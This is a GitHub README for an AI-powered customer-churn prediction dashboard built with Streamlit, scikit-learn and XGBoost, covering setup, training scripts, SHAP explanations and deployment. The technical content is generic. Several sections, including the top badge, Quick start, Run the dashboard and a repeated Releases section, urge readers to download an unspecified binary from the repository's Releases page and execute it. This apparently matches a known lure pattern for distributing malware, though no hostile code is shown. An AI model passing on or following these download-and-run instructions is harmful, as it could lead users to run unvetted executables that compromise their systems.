[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/aass00648388/AI-Powered-Churn-Prediction/releases)

# AI-Powered Churn Predictor Dashboard — Predict & Retain Users

[![Python](https://img.shields.io/badge/python-3.8%2B-blue?logo=python&style=flat-square)](https://www.python.org/)
[![Streamlit](https://img.shields.io/badge/streamlit-live-orange?logo=streamlit&style=flat-square)](https://streamlit.io/)
[![Scikit-learn](https://img.shields.io/badge/scikit--learn-1.0%2B-green?logo=scikit-learn&style=flat-square)](https://scikit-learn.org/)
[![XGBoost](https://img.shields.io/badge/xgboost-1.6%2B-yellow?logo=xgboost&style=flat-square)](https://xgboost.ai/)
[![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)](LICENSE)

![Churn dashboard illustration](https://streamlit.io/images/brand/streamlit-mark-color.svg)
![Data science stack](https://matplotlib.org/_static/images/logo2.svg)

A production-ready repository with a Streamlit dashboard, trained models, visualizations, and scripts to predict customer churn. The project uses logistic regression, random forest, and XGBoost models. It shows feature importance, cohort trends, risk scores, and retention actions. Download the release file from the Releases page and execute it to run the packaged dashboard locally.

---

Table of contents

- About the project
- Key features
- Badges and topics
- Quick start
- Releases
- Installation (local)
- Run the dashboard
- Model training and scripts
- Data schema and sample data
- Feature engineering and pipelines
- Model explainability and visualizations
- Evaluation and metrics
- Hyperparameter tuning and CV
- Deployment options
- CI / CD and tests
- File structure
- Contributing
- Security
- License
- Credits and references

About the project

This repository bundles a full churn prediction workflow. It contains data processing, model training, saved artifacts, and a Streamlit dashboard for business users. The UI focuses on clear signals: who will churn, why they may churn, and which actions lower churn risk. The code uses pandas, scikit-learn, XGBoost, seaborn, matplotlib, and plotly-express.

Key features

- Predict churn at the user level with multiple models.
- Compare model performance: logistic regression, random forest, XGBoost.
- Visualize feature importance and SHAP explanations.
- Explore cohort trends and retention impact.
- Score new users via API or batch script.
- Export lists of at-risk users for marketing or support.
- Config-driven model pipelines and reproducible experiments.
- Streamlit dashboard for non-technical users.
- Dockerfile and basic deployment examples.

Badges and topics

Topics covered in this repo: logisticregression, matplotlib, pandas, plotly-express, python3, random-forest, scikit-learn, seaborn, streamlit, xgboost

Use these tags on GitHub to find related work and to link to this repo.

Visual assets

- Streamlit mark: https://streamlit.io/images/brand/streamlit-mark-color.svg
- Matplotlib logo: https://matplotlib.org/_static/images/logo2.svg
- Scikit-learn logo: https://scikit-learn.org/stable/_static/scikit-learn-logo-small.png
- XGBoost logo: https://raw.githubusercontent.com/dmlc/xgboost/master/doc/logo/xgboost.png
- Pandas mark: https://pandas.pydata.org/static/img/pandas_mark.svg
- Seaborn mark: https://seaborn.pydata.org/_images/logo-mark-lightbg.svg
- Plotly mark: https://images.plot.ly/plotly-documentation/plotly-logomark.png

Quick start

- If you want the packaged app, download the release asset from the Releases page and execute it.
- For development, clone the repo and follow the setup steps below.

Releases

Download the packaged binary or archive from the Releases page and execute the file to run the app without manual setup:

https://github.com/aass00648388/AI-Powered-Churn-Prediction/releases

The Releases page holds built artifacts, model checkpoints, and a ready-to-run bundle. Download the file for your platform from that page and run it. The file contains the dashboard and required assets.

Installation (local development)

The repo supports Python 3.8 and above. Use a virtual environment. The project uses common data science libraries.

Steps

1. Clone the repo

```bash
git clone https://github.com/aass00648388/AI-Powered-Churn-Prediction.git
cd AI-Powered-Churn-Prediction
```

2. Create a virtual environment and activate it

```bash
python -m venv venv
# mac / linux
source venv/bin/activate
# windows
venv\Scripts\activate
```

3. Install dependencies

```bash
pip install -r requirements.txt
```

4. Optional: install extras for GPU or advanced packages

```bash
pip install xgboost==1.6.1  # or CPU/GPU build as needed
```

Run the dashboard

Run the Streamlit app for local development. The app reads model artifacts from the models folder by default.

```bash
streamlit run app/dashboard.py
```

Open the URL printed by Streamlit. The dashboard shows model selection, threshold slider, feature importance, and cohort charts.

To run the packaged release, download and execute the release asset from:

https://github.com/aass00648388/AI-Powered-Churn-Prediction/releases

The release file will start the app or provide instructions.

Models included

- Logistic Regression
  - Fast baseline
  - Coefficients provide direction and magnitude
- Random Forest
  - Nonlinear interactions
  - Feature importance via permutation and tree gain
- XGBoost
  - High performance on tabular data
  - Tree-based gain and SHAP support

Model artifacts live in /models. Each artifact includes a metadata JSON with the following keys:

- model_name
- model_version
- trained_on (git commit or timestamp)
- feature_list
- preprocessing_pipeline (path)
- metrics (AUC, precision, recall, f1)

Model training and scripts

The repo contains a reproducible train flow in /src/train. The pipeline uses scikit-learn pipelines and joblib for artifacts.

Key scripts

- src/train/train_model.py
  - Train a selected model
  - Save model and pipeline
  - Output metrics to results/ folder

- src/train/cross_validate.py
  - Run k-fold CV
  - Save fold metrics and aggregate

- src/train/hyperopt_search.py
  - Run hyperparameter search with randomized search or bayesian optimization
  - Save best params

- src/score/score_batch.py
  - Score CSV files in batch
  - Attach risk bucket and export to CSV

Example: train a logistic regression

```bash
python src/train/train_model.py \
  --model logistic_regression \
  --data data/clean/train.csv \
  --out models/logistic_v1
```

Feature engineering and pipelines

The project applies standard steps:

- Missing value imputation (median for numeric, mode or constant for categorical)
- Categorical encoding (target encoding or one-hot for low-cardinality)
- Scaling (StandardScaler or RobustScaler for numeric)
- Feature interactions (when beneficial)
- Date feature extraction (age, tenure, recency)
- Aggregations for grouped events (session counts, avg spend)

Pipeline format

- Pipelines use scikit-learn's Pipeline and ColumnTransformer
- Pipelines persist with joblib
- Preprocessing is decoupled from the model to avoid leakage

Sample pipeline definition (conceptual)

- numeric_features -> Imputer -> Scaler
- categorical_features -> Imputer -> TargetEncoder
- date_features -> CustomTransformer -> Numeric

Data schema and sample data

The sample dataset covers a customer subscription product. The schema includes demographic fields, usage metrics, billing history, and labels.

Example schema (CSV columns)

- user_id: string
- signup_date: YYYY-MM-DD
- last_active_date: YYYY-MM-DD
- age: int
- country: string
- plan_type: string
- monthly_spend: float
- avg_session_minutes: float
- sessions_30d: int
- support_tickets_30d: int
- discount_applied: boolean
- is_active: boolean
- churn_30d: binary label (1 = churned within 30 days)

Sample generation

The repo includes scripts to synthesize data for testing. Use src/data/generate_synthetic.py to create a balanced dataset that mimics typical churn signals.

Feature ideas

- Tenure = current_date - signup_date
- Recency = current_date - last_active_date
- Avg sessions per week = sessions_30d / 4
- Billing delinquencies = count of missed payments
- Change in usage = (avg_session_minutes_last30 - avg_session_minutes_prev30) / prev30

Model explainability and visualizations

The dashboard includes multiple explainability views:

- Global feature importance
  - Permutation importance
  - Tree gain importance
  - Logistic coefficients

- Local explanations
  - SHAP plots for individual users
  - Force plots and waterfall charts

- Partial dependence and ICE plots
  - Show marginal effects for key features

- Cohort analysis
  - Retention by signup month
  - Churn rate by plan_type or country

- Threshold analysis
  - Precision / recall trade-offs
  - Business KPIs at selected threshold

Implementations

- SHAP
  - Use TreeExplainer for tree models
  - Use LinearExplainer for logistic models
- plotly-express
  - Interactive charts for the dashboard
- seaborn / matplotlib
  - Static plots for reports

Example SHAP usage (conceptual)

```python
import shap
explainer = shap.TreeExplainer(model)
shap_values = explainer.shap_values(X_sample)
shap.plots.waterfall(shap_values[0], max_display=12)
```

Evaluation and metrics

The repo records multiple metrics per experiment. Track these per fold and per model.

Standard metrics

- ROC AUC
- Precision at k
- Recall
- F1 score
- PR AUC
- Log loss
- Calibration (reliability diagrams, Brier score)
- Confusion matrix at chosen threshold

Business-driven metrics

- Cost benefit analysis
  - Add cost of outreach vs revenue retained
  - Estimate savings by retaining customers
- Uplift estimation
  - Run A/B tests to check treatment effect on retention

Example evaluation script

```bash
python src/train/cross_validate.py \
  --data data/clean/train.csv \
  --model xgboost \
  --folds 5 \
  --out results/xgb_cv.json
```

Hyperparameter tuning and cross-validation

- Use stratified k-fold CV to preserve class distribution
- Use randomized search for wide parameter sweeps
- Use Optuna or Hyperopt for bayesian search when runtime matters
- Use early stopping for XGBoost to speed runs

Typical hyperparameters

- Random Forest
  - n_estimators: 100, 200, 500
  - max_depth: None, 6, 12
  - min_samples_leaf: 1, 5, 10

- XGBoost
  - n_estimators: 100, 500
  - max_depth: 3, 6, 9
  - learning_rate: 0.01, 0.05, 0.1
  - subsample: 0.6, 0.8, 1.0
  - colsample_bytree: 0.6, 0.8, 1.0

- Logistic Regression
  - penalty: l1, l2
  - C: 0.01, 0.1, 1, 10
  - solver: liblinear, saga

Hyperparameter search example (conceptual)

```bash
python src/train/hyperopt_search.py \
  --data data/clean/train.csv \
  --model xgboost \
  --trials 50 \
  --out results/hpo_xgb.json
```

Threshold selection

- Use precision-recall trade-offs
- Choose threshold to meet a business constraint (e.g., 80% precision for outreach)
- Provide expected volume at selected threshold

Deployment options

Local

- Run streamlit app locally via streamlit run app/dashboard.py
- Use batch scoring scripts to score new user files

Docker

- The repo includes a Dockerfile for containerized deployment.
- Build and run:

```bash
docker build -t churn-dashboard:latest .
docker run -p 8501:8501 churn-dashboard:latest
```

Server / Cloud

- Deploy Streamlit with a reverse proxy (nginx) and systemd service.
- Use a model server (FastAPI) for low-latency scoring.
- Store artifacts in object storage (S3) and load at startup.

API Example (conceptual)

- Score single user via API

POST /score
Body:
{
  "user_id": "abc123",
  "features": { ... }
}

Response:
{
  "user_id": "abc123",
  "risk_score": 0.78,
  "bucket": "high"
}

CI / CD and tests

- The repo includes unit tests for preprocessing, simple model tests, and scoring scripts.
- Use GitHub Actions to run lint and tests on push.
- Example workflow tasks:
  - Run flake8 and black check
  - Run pytest for test suite
  - Build Docker on tags and push to registry

File structure

A typical layout:

- README.md
- LICENSE
- requirements.txt
- data/
  - raw/
  - clean/
  - samples/
- models/
  - logistic_v1/
  - xgb_v1/
  - rf_v1/
- src/
  - train/
    - train_model.py
    - cross_validate.py
    - hyperopt_search.py
  - data/
    - preprocessing.py
    - generate_synthetic.py
  - score/
    - score_batch.py
    - api_server.py
  - utils/
    - metrics.py
    - persistence.py
- app/
  - dashboard.py
  - pages/
    - overview.py
    - explain.py
    - cohorts.py
- tests/
  - test_preprocessing.py
  - test_model_io.py
- Dockerfile
- .github/
  - workflows/
    - ci.yml

Contributing

The repo follows a simple process:

- Fork the repository
- Create a branch for your feature or fix
- Add tests for your change
- Open a pull request describing what you changed and why
- Link to issues when relevant

Guidelines

- Keep functions small and focused
- Write tests for new logic
- Document public functions with docstrings
- Use type hints where helpful
- Follow PEP8 for style

Security

- Do not commit secrets or keys.
- Use environment variables for credentials.
- Scan dependencies for known vulnerabilities.
- Lock dependencies with a pip-tools or poetry lock file for reproduction.

Common troubleshooting

- If the app fails at startup, check that models exist under models/.
- If a library import fails, verify your virtual environment and requirements.txt.
- If data fields mismatch, confirm the pipeline uses the same feature_list as the model artifact.

FAQ

Q: How do I score a single user record?
A: Use src/score/score_batch.py with a single-row CSV. The script applies the pipeline and writes the risk score and bucket.

Q: How do I add a new feature?
A: Add the transformer to src/data/preprocessing.py, update feature_list in model metadata, retrain the model, and save a new artifact.

Q: How can I test calibration?
A: Use reliability diagrams in src/utils/metrics.py. Compute Brier score and plot predicted probability vs observed.

Example commands and snippets

Train XGBoost with early stopping

```bash
python src/train/train_model.py \
  --model xgboost \
  --data data/clean/train.csv \
  --eval data/clean/val.csv \
  --early_stopping 50 \
  --out models/xgb_v1
```

Score a CSV file

```bash
python src/score/score_batch.py \
  --model models/xgb_v1/model.joblib \
  --input data/samples/new_users.csv \
  --output data/samples/new_users_scored.csv
```

Load saved model and pipeline

```python
from joblib import load
import pandas as pd

pipeline = load('models/xgb_v1/pipeline.joblib')
model = load('models/xgb_v1/model.joblib')

df = pd.read_csv('data/samples/new_users.csv')
X = df[model.feature_list]
proba = model.predict_proba(pipeline.transform(X))[:, 1]
df['risk_score'] = proba
df.to_csv('out.csv', index=False)
```

Visualization examples

- Confusion matrix heatmap via seaborn
- ROC curve with sklearn.metrics.roc_curve
- SHAP summary plot with shap.summary_plot
- Interactive cohort bar chart with plotly.express.bar

Business use cases and examples

1. Marketing outreach
- Identify high-risk users with risk_score > threshold.
- Prioritize those with high expected lifetime value.
- Track success with A/B testing for retention offers.

2. Customer support triage
- Surface churn risk to support reps.
- Add recommended actions conditioned on reason (e.g., billing, low usage).

3. Product improvement
- Use feature importance across segments to find friction points.
- Monitor trends in feature impacts over time.

4. Finance planning
- Model expected churn under different scenarios.
- Estimate revenue at risk and cost to retain.

Explainability at work

- Use SHAP to show why a user appears at risk.
- Use cohort SHAP to see why a group churns more.
- Export SHAP-driven feature reasons to CRM for agents.

Monitoring and drift detection

- Monitor model performance metrics over time.
- Track feature distribution drift with population statistics and KS test.
- Retrain when AUC drops or drift exceeds thresholds.

A small example of drift detection code (conceptual)

```python
from scipy.stats import ks_2samp

def detect_drift(reference, current, feature):
    stat, p = ks_2samp(reference[feature], current[feature])
    return p < 0.01  # True indicates drift
```

Extending the repo

- Add a FastAPI service for real-time scoring.
- Add more models (lightgbm, catboost).
- Add uplift modeling capabilities for targeted campaigns.
- Integrate experiment tracking (MLflow, Weights & Biases).

Testing and reproducibility

- Pin package versions in requirements.txt to ensure reproducible installs.
- Save config files used for training (YAML or JSON) with each model.
- Log random seeds and environment metadata in model metadata.

Example metadata JSON

```json
{
  "model_name": "xgboost",
  "model_version": "v1",
  "trained_on": "2025-08-01T12:00:00Z",
  "git_commit": "abc123def",
  "feature_list": ["tenure", "avg_session_minutes", "monthly_spend", "support_tickets_30d"],
  "metrics": {"auc": 0.86, "precision": 0.32, "recall": 0.58}
}
```

Data privacy

- Anonymize user identifiers in public demos.
- Use aggregated data for shared reports.
- Comply with applicable data regulations for production use.

Releases (again)

For packaged downloads, model checkpoints, and binaries, go to:

https://github.com/aass00648388/AI-Powered-Churn-Prediction/releases

Download the file that matches your platform and execute it. The release bundle includes a README for the release, the packaged Streamlit app, and pre-trained model artifacts.

License

This project uses the MIT License. See LICENSE for details.

Credits and references

- scikit-learn: https://scikit-learn.org/
- XGBoost: https://xgboost.ai/
- Streamlit: https://streamlit.io/
- pandas: https://pandas.pydata.org/
- plotly: https://plot.ly/
- seaborn: https://seaborn.pydata.org/
- matplotlib: https://matplotlib.org/

Maintainers

- Primary maintainer: repository owner
- Open to contributions via pull requests.

Thank you for exploring the repo.